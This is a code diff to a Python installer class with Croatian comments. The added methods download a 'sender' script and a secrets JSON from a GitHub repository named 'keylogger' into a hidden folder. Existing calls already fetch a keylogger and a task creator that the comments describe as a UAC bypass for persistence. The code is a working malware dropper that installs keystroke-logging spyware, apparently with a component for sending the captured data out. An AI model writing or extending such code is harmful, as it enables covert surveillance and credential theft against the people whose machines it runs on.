@@ -60,6 +60,32 @@ class Inicijalizacija:
 
 ##########################################################################################################################################################################
 
+    def downloadSender(self):
+        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/sender.pyw" # url lokacije datoteke koja kreira task
+        response = requests.get(url)
+
+        if response.status_code == 200:
+            with open("c:\\skriveni_folder\\sender.pyw", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
+                file.write(response.content)
+            print(f"File je uspješno preuzet.")
+        else:
+            print("Pogreška prilikom preuzimanja.")
+
+##########################################################################################################################################################################
+
+    def downloadTajna(self):
+        url = "https://github.com/B-nad/keylogger/raw/refs/heads/main/jako_safe_nacin_za_distribuiranje_tajni.json" # url lokacije datoteke koja kreira task
+        response = requests.get(url)
+
+        if response.status_code == 200:
+            with open("c:\\skriveni_folder\\jako_safe_nacin_za_distribuiranje_tajni.json", "wb") as file: # kreiranje task kreatora i upisivanje dohvaćene datoteke u njega
+                file.write(response.content)
+            print(f"File je uspješno preuzet.")
+        else:
+            print("Pogreška prilikom preuzimanja.")
+
+##########################################################################################################################################################################
+
     def createTask(self):
         powershell_script = r"""
         Param ([String]$program = '"c:\skriveni_folder\task kreator.exe"')  # Zaseban file napisan u c++ koji služi za UAC bypass prilikom kreiranja scheduled
@@ -84,4 +110,6 @@ inicijalizacija = Inicijalizacija()
 inicijalizacija.moveFile()
 inicijalizacija.downloadKeylogger()
 inicijalizacija.downloadTaskKreator()
+inicijalizacija.downloadSender()
+inicijalizacija.downloadTajna()
 inicijalizacija.createTask()
